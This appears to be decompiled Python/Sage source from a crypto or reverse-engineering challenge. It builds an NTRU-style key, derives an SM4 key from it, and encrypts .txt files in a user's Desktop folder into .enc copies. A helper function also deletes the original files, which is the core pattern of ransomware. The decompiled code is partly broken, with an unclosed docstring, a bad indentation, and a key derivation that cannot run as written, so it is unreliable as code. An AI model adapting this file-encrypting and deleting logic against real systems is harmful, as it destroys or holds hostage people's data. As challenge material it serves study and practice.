# Visit https://www.lddgo.net/string/pyc-compile-decompile for more information
# Version : Python 3.8

"""
Created on Sun Mar 30 18:25:08 2025

@author: Crypto0

import re
import base64
import os
import sys
from gmssl import sm4
from Crypto.Util.Padding import pad
import binascii
from random import shuffle, randrange

N = 49
p = 3
q = 128
d = 3
assert q > (6 * d + 1) * p
R.<x> = ZZ[]
def generate_T(d1, d2):
    assert N >= d1 + d2
    s = [1] * d1 + [-1] * d2 + [0] * (N - d1 - d2)
    shuffle(s)
    return R(s)

def invert_mod_prime(f, p):
    Rp = R.change_ring(Integers(p)).quotient(x^N - 1)
    return R(lift(1 / Rp(f)))

def convolution(f, g):
    return (f * g) % (x^N - 1)

def lift_mod(f, q):
    return R([((f[i] + q // 2) % q) - q // 2 for i in range(N)])

def poly_mod(f, q):
    return R([f[i] % q for i in range(N)])

def invert_mod_pow2(f, q):
    assert q.is_power_of(2)
    g = invert_mod_prime(f, 2)
    while True:
        r = lift_mod(convolution(g, f), q)
        if r == 1:
            return g
        g = lift_mod(convolution(g, 2 - r), q)

def generate_message():
    return R([randrange(p) - 1 for _ in range(N)])

def generate_key():
    while True:
        try:
            f = generate_T(d + 1, d)
            g = generate_T(d, d)
            Fp = poly_mod(invert_mod_prime(f, p), p)
            Fq = poly_mod(invert_mod_pow2(f, q), q)
            break
        except:
            continue
    h = poly_mod(convolution(Fq, g), q)
    return h, (f, g)

def encrypt_message(m, h):
    e = lift_mod(p * convolution(h, generate_T(d, d)) + m, q)
    return e

def save_ntru_keys():
    h, secret = generate_key()
    with open("pub_key.txt", "w") as f:
        f.write(str(h))
    m = generate_message()
    with open("priv_key.txt", "w") as f:
        f.write(str(m))
    e = encrypt_message(m, h)
    with open("enc.txt", "w") as f:
        f.write(str(e))

def terms(poly_str):
    terms = []
    pattern = r\'([+-]?\\s*x\\^?\\d*|[-+]?\\s*\\d+)\'
    matches = re.finditer(pattern, poly_str.replace(\' \', \'\'))

    for match in matches:
        term = match.group()
        if term == \'+x\' or term == \'x\':
            terms.append(1)
        elif term == \'-x\':
            terms.append(-1)
        elif \'x^\' in term:
            coeff_part = term.split(\'x^\')[0]
            exponent = int(term.split(\'x^\')[1])
            if not coeff_part or coeff_part == \'+\':
                coeff = 1
            elif coeff_part == \'-\':
                coeff = -1
            else:
                coeff = int(coeff_part)
            terms.append(coeff * exponent)
        elif \'x\' in term:
            coeff_part = term.split(\'x\')[0]
            if not coeff_part or coeff_part == \'+\':
                terms.append(1)
            elif coeff_part == \'-\':
                terms.append(-1)
            else:
                terms.append(int(coeff_part))
        else:
            if term == \'+1\' or term == \'1\':
                terms.append(0)
                terms.append(-0)
    return terms

def gen_key(poly_terms):
    binary = [0] * 128
    for term in poly_terms:
        exponent = abs(term)
        if term > 0 and exponent <= 127:
            binary[127 - exponent] = 1
    binary_str = \'\'.join(map(str, binary))
    hex_key = hex(int(binary_str, 2))[2:].upper().zfill(32)
    return hex_key

def read_polynomial_from_file(filename):
    with open(filename, \'r\') as file:
        return file.read().strip()


def sm4_encrypt(key, plaintext):
    assert len(key) == 16, "SM4 key must be 16 bytes"
    cipher = sm4.CryptSM4()
    cipher.set_key(key, sm4.SM4_ENCRYPT)
    padded_plaintext = pad(plaintext, 16)
    return cipher.crypt_ecb(padded_plaintext)

def sm4_encrypt_file(input_path, output_path, key):
    with open(input_path, \'rb\') as f:
        plaintext = f.read()

    ciphertext = sm4_encrypt(key, plaintext)

    with open(output_path, \'wb\') as f:
        f.write(ciphertext)

def resource_path(relative_path):
    if getattr(sys, \'frozen\', False):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def encrypt_directory(directory, sm4_key, extensions=[".txt"]):
    if not os.path.exists(directory):
        print(f"Directory does not exist: {directory}")
        return

    for root, _, files in os.walk(directory):
        for file in files:
            if any(file.endswith(ext) for ext in extensions):
                input_path = os.path.join(root, file)
                output_path = input_path + ".enc"

                try:
                    sm4_encrypt_file(input_path, output_path, sm4_key)
                    os.remove(input_path)
                    print(f"Encrypted: {input_path} -> {output_path}")
                except Exception as e:
                    print(f"Error encrypting {input_path}: {str(e)}")

def main():
    try:
        save_ntru_keys()
        poly_str = read_polynomial_from_file("priv_key.txt")
        poly_terms = terms(poly_str)
        sm4_key = binascii.unhexlify(poly_terms)
        user_name = os.getlogin()
        target_dir = os.path.join("C:\\Users", user_name, "Desktop", "test_files")

        if not os.path.exists(target_dir):
            os.makedirs(target_dir, exist_ok=True)
            print(f"Created directory: {target_dir}")
            return

        txt_files = [f for f in os.listdir(target_dir)
                    if f.endswith(\'.txt\') and os.path.isfile(os.path.join(target_dir, f))]

        if not txt_files:
            print("No .txt files found in directory")
            return

        for txt_file in txt_files:
            file_path = os.path.join(target_dir, txt_file)
            try:
                with open(file_path, \'rb\') as f:
                    test_data = f.read()

                ciphertext = sm4_encrypt(sm4_key, test_data)
                encrypted_path = file_path + \'.enc\'

                with open(encrypted_path, \'wb\') as f:
                f.write(ciphertext)
            except Exception as e:
                print(f"Error processing {txt_file}: {str(e)}")

    except Exception as e:
        print(f"Fatal error: {str(e)}")

if __name__ == "__main__":
    main()
"""
